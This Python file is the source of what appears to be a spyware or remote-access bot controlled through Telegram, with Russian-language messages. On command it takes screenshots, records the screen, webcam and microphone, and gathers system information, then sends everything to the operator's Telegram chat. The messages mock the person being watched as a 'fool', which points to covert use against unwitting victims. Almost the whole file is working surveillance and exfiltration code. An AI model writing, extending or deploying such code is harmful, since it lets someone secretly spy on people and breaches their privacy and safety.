import asyncio
import os
import types
import pyautogui
from aiogram import Bot, Dispatcher, types
from aiogram.filters.command import Command
from aiogram.types import FSInputFile
from other_utilits.getusersystem import get_system_info
from recording.screen_recording import record_screen
from recording.camera_recording import record_video
from recording.audio_recording import record_audio
from dotenv import load_dotenv

load_dotenv()

AUDIO_FILENAME = "audio.wav"
DEFAULT_DURATION_SEC = 5
SAMPLE_RATE = 44100
CHANNELS = 1

DEFAULT_FPS = 15
VIDEO_PATH = "Record.mp4"

SCREEN_PATH = 'screenshot.png'

api_token_env = os.getenv('API_TOKEN')
api_token = "-"


async def main():
    bot = Bot(token=api_token_env)
    dp = Dispatcher()

    @dp.message(Command('001'))
    @dp.message(Command('cheese'))
    async def create_window_screenshot(message: types.Message):
        screen_oluxa = pyautogui.screenshot()
        screen_oluxa.save(SCREEN_PATH)
        output_photo = FSInputFile(SCREEN_PATH)

        await message.answer_photo(photo=output_photo,
                                   caption=str(get_system_info()))
        os.remove(SCREEN_PATH)

    @dp.message(Command('002'))
    @dp.message(Command('screenView'))
    async def recording_window_screen(message: types.Message) -> None:
        """/screenView <seconds> <fps>"""
        chat_id = message.chat.id
        duration = DEFAULT_DURATION_SEC
        fps = DEFAULT_FPS

        args = message.text.split()

        if len(args) > 1 and args[1].isdigit():
            requested_duration = int(args[1])
            if 1 <= requested_duration <= 60:
                duration = requested_duration
            else:
                await message.answer("Длительность должна быть от 1 до 60 секунд")
                return

        if len(args) > 2 and args[2].isdigit():
            requested_fps = int(args[2])
            if 1 <= requested_fps <= 60:
                fps = requested_fps
            else:
                await message.answer("FPS должен быть от 1 до 60")
                return

        await message.answer(f"{duration} секунд, {fps} FPS...")

        loop = asyncio.get_running_loop()
        try:
            success, error_msg = await loop.run_in_executor(
                None, record_screen, VIDEO_PATH, duration, fps
            )
        except Exception as e:
            await message.answer(f"Произошла ошибка при запуске записи: {e}")
            return

        if success and os.path.exists(VIDEO_PATH):
            await message.answer("Запись экрана олуха завершена.")

            try:
                video_file = FSInputFile(VIDEO_PATH)

                await bot.send_video(
                    chat_id=chat_id,
                    video=video_file,
                    caption=f"Видео с экрана ({duration} сек, {fps} FPS)"
                )

            except Exception as e:
                await message.answer(f"Ошибка при отправке видео: {e}")
            finally:
                os.remove(VIDEO_PATH)

        else:
            await message.answer(f"Не удалось записать экран. Причина: {error_msg}")

    @dp.message(Command('003'))
    @dp.message(Command('cameraView'))
    async def recording_camera_video(message: types.Message):
        chat_id = message.chat.id

        await message.answer("Начинаю запись")

        loop = asyncio.get_running_loop()
        try:
            success = await loop.run_in_executor(
                None, record_video, VIDEO_PATH, DEFAULT_DURATION_SEC, DEFAULT_FPS
            )
        except Exception as e:
            await message.answer(f"ошибка при записи видео: {e}")
            return

        if success and os.path.exists(VIDEO_PATH):
            await message.answer("Запись завершена.")

            try:
                video_file = types.FSInputFile(VIDEO_PATH)

                await bot.send_video(
                    chat_id=chat_id,
                    video=video_file,
                    caption="Видео с веб-камеры (5 сек, 15 FPS)"
                )
                await message.answer("Видео успешно отправлено!")

            except Exception as e:
                await message.answer(f"Произошла ошибка при отправке видео: {e}")

            finally:
                os.remove(VIDEO_PATH)

        else:
            await message.answer("Проверьте подключение веб-камеры.")

    @dp.message(Command('004'))
    @dp.message(Command('usersystem'))
    async def get_full_system_info(message: types.Message):
        await message.answer(str(get_system_info(True)))

    @dp.message(Command('005'))
    @dp.message(Command('audioView'))
    async def recording_audio(message: types.Message):
        """Принимает аргумент времени: /005 <sec>"""
        chat_id = message.chat.id
        duration = DEFAULT_DURATION_SEC

        args = message.text.split()

        if len(args) > 1 and args[1].isdigit():
            requested_duration = int(args[1])
            if 1 <= requested_duration <= 300:
                duration = requested_duration
            else:
                return

        await message.answer(f"Начинаю запись аудио с микрофона на {duration} секунд...")

        loop = asyncio.get_running_loop()
        try:
            success, error_msg = await loop.run_in_executor(
                None, record_audio, AUDIO_FILENAME, duration, SAMPLE_RATE, CHANNELS
            )
        except Exception as e:
            await message.answer(f"Произошла ошибка при запуске записи: {e}")
            return

        if success and os.path.exists(AUDIO_FILENAME):
            await message.answer("Запись аудио завершена.")

            try:
                audio_file = FSInputFile(AUDIO_FILENAME)

                await bot.send_audio(
                    chat_id=chat_id,
                    audio=audio_file,
                    caption=f"Аудиозапись с микрофона олуха\nMade by nineteenager"
                )

            except Exception as e:
                await message.answer(f"Произошла ошибка при отправке аудио: {e}")
            finally:
                os.remove(AUDIO_FILENAME)

        else:
            await message.answer(f"Не удалось записать аудио. Причина: {error_msg}")

    await dp.start_polling(bot)
